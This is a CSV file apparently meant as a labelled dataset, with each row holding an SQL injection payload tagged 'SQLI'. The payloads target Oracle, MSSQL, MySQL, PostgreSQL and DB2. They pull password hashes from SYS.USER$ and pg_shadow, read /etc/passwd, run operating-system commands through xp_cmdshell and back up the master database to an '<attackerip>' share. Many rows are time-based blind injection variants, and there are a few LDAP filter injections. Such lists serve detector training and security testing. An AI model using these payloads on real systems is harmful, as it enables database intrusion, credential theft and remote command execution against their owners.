payload,attack
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",SQLI
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",SQLI
"<>""'%;)(&+",SQLI
0 or 1=1,SQLI
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),SQLI
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,SQLI
0x77616974666F722064656C61792027303A303A31302700 exec(@s),SQLI
"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",SQLI
1 or 1=1,SQLI
1;SELECT%20*,SQLI
1 waitfor delay '0:0:10'--,SQLI
%20or%20''=',SQLI
%20or%201=1,SQLI
)%20or%20('x'='x,SQLI
%20or%20'x'='x,SQLI
%20or%20x=x,SQLI
%20'sleep%2050',SQLI
%20$(sleep%2050),SQLI
21%,SQLI
23 OR 1=1,SQLI
26%,SQLI
%27%20or%201=1,SQLI
28%,SQLI
29%,SQLI
%2A%28%7C%28mail%3D%2A%29%29,SQLI
%2A%28%7C%28objectclass%3D%2A%29%29,SQLI
%2A%7C,SQLI
||'6,SQLI
(||6),SQLI
%7C,SQLI
admin' or ',SQLI
" and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",SQLI
 and 1 in (select var from temp)--,SQLI
anything' OR 'x'='x,SQLI
"""a"""" or 1=1--""",SQLI
a' or 1=1--,SQLI
"""a"""" or 3=3--""",SQLI
a' or 3=3--,SQLI
a' or 'a' = 'a,SQLI
&apos;%20OR,SQLI
a' waitfor delay '0:0:10'--,SQLI
; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > ,SQLI
bfilename,SQLI
char%4039%41%2b%40SELECT,SQLI
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),SQLI
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),SQLI
declare @q nvarchar (4000) select @q =,SQLI
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),SQLI
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ,SQLI
declare @s varchar(22) select @s =,SQLI
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,SQLI
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",SQLI
; exec master..xp_cmdshell,SQLI
; exec master..xp_cmdshell 'ping 172.10.1.255'--,SQLI
exec(@s),SQLI
; exec ('sel' + 'ect us' + 'er'),SQLI
exec sp,SQLI
; execute immediate 'sel' || 'ect us' || 'er',SQLI
exec xp,SQLI
; exec xp_regread,SQLI
 group by userid having 1=1--,SQLI
 having 1=1--,SQLI
"hi or 1=1 --""",SQLI
hi' or 1=1 --,SQLI
"""hi"""") or (""""a""""=""""a""",SQLI
hi or a=a,SQLI
hi' or 'a'='a,SQLI
hi') or ('a'='a,SQLI
hi' or 'x'='x';,SQLI
*(|(mail=*)),SQLI
*(|(objectclass=*)),SQLI
 or ''=',SQLI
" or 0=0 #""",SQLI
 or 0=0 --,SQLI
 or 0=0 #,SQLI
""" or 0=0 --",SQLI
or 0=0 --,SQLI
or 0=0 #,SQLI
 or 1 --',SQLI
 or 1/*,SQLI
; or '1'='1',SQLI
 or '1'='1,SQLI
 or '1'='1'--,SQLI
 or 1=1,SQLI
 or 1=1 /*,SQLI
 or 1=1--,SQLI
 or 1=1-- ,SQLI
/**/or/**/1/**/=/**/1,SQLI
 or 1=1 --,SQLI
""" or 1=1--",SQLI
or 1=1,SQLI
or 1=1--,SQLI
" or 1=1 or """"=",SQLI
 or 1=1 or ''=',SQLI
 or 1 in (select @@version)--,SQLI
or%201=1,SQLI
or%201=1 --,SQLI
 or 2 > 1,SQLI
 or 2 between 1 and 3,SQLI
 or 3=3,SQLI
 or 3=3 --,SQLI
 or '7659'='7659,SQLI
 or a=a,SQLI
 or a = a,SQLI
 or 'a'='a,SQLI
 or a=a--,SQLI
) or ('a'='a,SQLI
""" or ""a""=""a",SQLI
) or (a=a,SQLI
order by,SQLI
 or (EXISTS),SQLI
 or isNULL(1/0) /*,SQLI
""" or isNULL(1/0) /*",SQLI
 or 'something' like 'some%',SQLI
 or 'something' = 'some'+'thing',SQLI
 or 'text' = n'text',SQLI
 or 'text' > 't',SQLI
 or uid like '%,SQLI
 or uname like '%,SQLI
 or 'unusual' = 'unusual',SQLI
 or userid like '%,SQLI
 or user like '%,SQLI
 or username like '%,SQLI
 or username like char(37);,SQLI
 or 'whatever' in ('whatever'),SQLI
 -- &password=,SQLI
password:*/=1--,SQLI
PRINT @@variable,SQLI
 select * from information_schema.tables--,SQLI
 select name from syscolumns where id = (select id from sysobjects where name = tablename')--,SQLI
 (select top 1,SQLI
--sp_password,SQLI
sqlattempt1,SQLI
(sqlattempt2),SQLI
sqlvuln,SQLI
+sqlvuln,SQLI
(sqlvuln),SQLI
sqlvuln;,SQLI
t'exec master..xp_cmdshell 'nslookup www.google.com'--,SQLI
to_timestamp_tz,SQLI
 UNION ALL SELECT,SQLI
 union all select @@version--,SQLI
 union select ,SQLI
uni/**/on sel/**/ect,SQLI
 UNION SELECT,SQLI
" union select 1,load_file('/etc/passwd'),1,1,1;",SQLI
) union select * from information_schema.tables;,SQLI
" union select * from users where login = char(114,111,111,116);",SQLI
||UTL_HTTP.REQUEST,SQLI
",@variable",SQLI
@variable,SQLI
@var select @var as var into temp end --,SQLI
\x27UNION SELECT,SQLI
x' AND 1=(SELECT COUNT(*) FROM tabname); --,SQLI
x' AND email IS NULL; --,SQLI
x' AND members.email IS NULL; --,SQLI
x' AND userid IS NULL; --,SQLI
x' or 1=1 or 'x'='y,SQLI
x' OR full_name LIKE '%Bob%,SQLI
ý or 1=1 --,SQLI
"select versionnumber, version_timestamp from sysibm.sysversions;",SQLI
select user from sysibm.sysdummy1;,SQLI
select session_user from sysibm.sysdummy1;,SQLI
select system_user from sysibm.sysdummy1;,SQLI
select current server from sysibm.sysdummy1;,SQLI
select name from sysibm.systables;,SQLI
select grantee from syscat.dbauth;,SQLI
select * from syscat.tabauth;,SQLI
select * from syscat.dbauth where grantee = current user;,SQLI
select * from syscat.tabauth where grantee = current user;,SQLI
"select name, tbname, coltype from sysibm.syscolumns;",SQLI
SELECT schemaname FROM syscat.schemata;,SQLI
select @@version,SQLI
select @@servernamee,SQLI
select @@microsoftversione,SQLI
select * from master..sysserverse,SQLI
select * from sysusers,SQLI
exec master..xp_cmdshell 'ipconfig+/all',SQLI
exec master..xp_cmdshell 'net+view',SQLI
exec master..xp_cmdshell 'net+users',SQLI
exec master..xp_cmdshell 'ping+<attackerip>',SQLI
BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',SQLI
"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'"" select * from myfile""--",SQLI
<username>' OR 1=1--,SQLI
OR '' = ',SQLI
<username>'--,SQLI
" union select 1, '<user-fieldname>', '<pass-fieldname>' 1--",SQLI
OR 1=1--,SQLI
create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;,SQLI
select version();,SQLI
select current_database();,SQLI
select current_user;,SQLI
select session_user;,SQLI
select current_setting('log_connections');,SQLI
select current_setting('log_statement');,SQLI
select current_setting('port');,SQLI
select current_setting('password_encryption');,SQLI
select current_setting('krb_server_keyfile');,SQLI
select current_setting('virtual_host');,SQLI
select current_setting('port');,SQLI
select current_setting('config_file');,SQLI
select current_setting('hba_file');,SQLI
select current_setting('data_directory');,SQLI
select * from pg_shadow;,SQLI
select * from pg_group;,SQLI
create table myfile (input TEXT);,SQLI
copy myfile from '/etc/passwd'; ,SQLI
select * from myfile;copy myfile to /tmp/test;,SQLI
)%20waitfor%20delay%20'0:0:20'%20/*,SQLI
)%20waitfor%20delay%20'0:0:20'%20--,SQLI
)%20waitfor%20delay%20'0:0:20'%20/*,SQLI
)%20waitfor%20delay%20'0:0:20'%20--,SQLI
""")%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""")%20waitfor%20delay%20'0:0:20'%20--",SQLI
))%20waitfor%20delay%20'0:0:20'%20/*,SQLI
))%20waitfor%20delay%20'0:0:20'%20--,SQLI
))%20waitfor%20delay%20'0:0:20'%20/*,SQLI
))%20waitfor%20delay%20'0:0:20'%20--,SQLI
"""))%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""))%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL)%20waifor%20delay%20'0:0:20'%20/*",SQLI
",NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
""",NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""",NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL)%20waifor%20delay%20'0:0:20'%20/*",SQLI
"),NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"""),NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""),NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SQLI
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SQLI
 waitfor delay '0:0:20' /* ,SQLI
 waitfor delay '0:0:20' --,SQLI
 waitfor delay '0:0:20' /* ,SQLI
 waitfor delay '0:0:20' --,SQLI
""" waitfor delay '0:0:20' /* ",SQLI
""" waitfor delay '0:0:20' --",SQLI
) waitfor delay '0:0:20' /* ,SQLI
) waitfor delay '0:0:20' --,SQLI
)) waitfor delay '0:0:20' /* ,SQLI
)) waitfor delay '0:0:20' --,SQLI
))) waitfor delay '0:0:20' /* ,SQLI
))) waitfor delay '0:0:20' --,SQLI
)))) waitfor delay '0:0:20' /* ,SQLI
)))) waitfor delay '0:0:20' --,SQLI
))))) waitfor delay '0:0:20' --,SQLI
)))))) waitfor delay '0:0:20' --,SQLI
) waitfor delay '0:0:20' /* ,SQLI
) waitfor delay '0:0:20' --,SQLI
""") waitfor delay '0:0:20' /* ",SQLI
""") waitfor delay '0:0:20' --",SQLI
)) waitfor delay '0:0:20' /* ,SQLI
)) waitfor delay '0:0:20' --,SQLI
""")) waitfor delay '0:0:20' /* ",SQLI
""")) waitfor delay '0:0:20' --",SQLI
))) waitfor delay '0:0:20' /* ,SQLI
))) waitfor delay '0:0:20' --,SQLI
"""))) waitfor delay '0:0:20' /* ",SQLI
"""))) waitfor delay '0:0:20' --",SQLI
)))) waitfor delay '0:0:20' /* ,SQLI
)))) waitfor delay '0:0:20' --,SQLI
""")))) waitfor delay '0:0:20' /* ",SQLI
""")))) waitfor delay '0:0:20' --",SQLI
))))) waitfor delay '0:0:20' /* ,SQLI
))))) waitfor delay '0:0:20' --,SQLI
"""))))) waitfor delay '0:0:20' /* ",SQLI
"""))))) waitfor delay '0:0:20' --",SQLI
)))))) waitfor delay '0:0:20' /* ,SQLI
)))))) waitfor delay '0:0:20' --,SQLI
""")))))) waitfor delay '0:0:20' /* ",SQLI
""")))))) waitfor delay '0:0:20' --",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* ",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* ",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* ",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",SQLI
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",SQLI
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",SQLI
